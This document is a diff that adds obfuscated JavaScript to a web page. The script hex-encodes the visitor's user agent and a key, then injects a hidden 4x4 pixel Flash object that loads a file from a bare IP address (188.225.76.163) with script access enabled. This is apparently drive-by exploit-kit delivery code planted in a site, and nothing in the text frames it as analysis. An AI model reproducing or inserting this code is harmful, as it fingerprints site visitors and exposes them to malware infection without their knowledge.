@@ -1,0 +1,23 @@
+/*s75260d26376hssfj7725fs*/function hgfgerdfgdf(num, width){/*s88223d46311hfj71026fs*/var vcbcvbnfd = "0123456789abcdef";var hgfgghf = "";/*s38937d14314hfj15384fs*/var hgfgerdfgdf = vcbcvbnfd.substr(num & 0xF, 1);while (num > 0xF) {num = num >>> 4;hgfgerdfgdf = vcbcvbnfd.substr(num & 0xF, 1) + hgfgerdfgdf;}var width = (width ? width : 0); while (hgfgerdfgdf.length < width)hgfgerdfgdf = "0" + hgfgerdfgdf;return hgfgerdfgdf;}/*s23196d76573hfj60676fs*/function ghnvbn(u, k) {var fr=String.fromCharCode;var c="", b="", d="", f=fr(0x20), g=fr(0), v=fr(0x22);/*s24208d61914hfj65994fs*/var app=k+v+f+v+u+v+f+v+navigator.userAgent+v+g+g+g+g;app.length%2 && (app+=g);for (var e = 0; e < app.length; e++) {b = hgfgerdfgdf(app.charCodeAt(e),2);d = hgfgerdfgdf(app.charCodeAt(e+1),2);/*sdhd81774hfs*/c += b + d;/*s55733d89984hfj51116fs*/e += 1;}return c;}/*s15248dfsffd*/
+
+	function hfdf(fus,asd)
+	{
+	var cvbfh = '<object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" allowScriptAccess=always width="4" height="4">';
+	cvbfh = cvbfh + '<param name="movie" value="' + fus + '" />';
+	cvbfh = cvbfh + '<param name="play" value="true"/>';
+	cvbfh = cvbfh + '<param name=FlashVars value="menu=' + asd + '" />';
+	cvbfh = cvbfh + '<!--[if !IE]>-->';
+	cvbfh = cvbfh + '<object type="application/x-shockwave-flash" data="' + fus + '" allowScriptAccess=always width="4" height="4">';
+	cvbfh = cvbfh + '<param name="movie" value="' + fus + '" />';
+	cvbfh = cvbfh + '<param name="play" value="true"/>';
+	cvbfh = cvbfh + '<param name=FlashVars value="menu=' + asd +   '" />';
+	cvbfh = cvbfh + '<!--<![endif]-->';
+	cvbfh = cvbfh + '<!--[if !IE]>--></object><!--<![endif]-->';
+	cvbfh = cvbfh + '</object>';
+
+	var ffert = document.createElement("div");
+	ffert.innerHTML = cvbfh;
+	document.body.appendChild(ffert);
+	} 
+	
+	hfdf("http://188.225.76.163/?ripped&news=xHrQMrLYbRvFFYHfKP7EUKBEMUzWA0KKwYqZhavVF5qxFDXGpbf1FxjspV6dCFmEmvBvdLYHIwCh1UbASwZ&money=hnY1YBl9C8q39ikTSyhKZgJLRrxCKZw5GqpfHRrJq21imm7ISdc91xhWKumQBye4tVFkT5QkQlK37VaSO-w&cars=2404&recognize=4563", ghnvbn("http://188.225.76.163/?ripped&news=xHrQMrTYbRzFFYffKPjEUKFEMUzWA0KKwYqZhavVF52xFDLGpbb1FxnspVmdCFiEmvBvdLEHIwCh1UHASwF&cars=1967&money=hnYpYBllC8q39ikXSyhKZgJPRrxaKZw9GqpbHRrVq216mm7USdc51xhWKumQByektW14V4Q4Vm6v7S6KJrg&recognize=5725","gexywoaxor"));
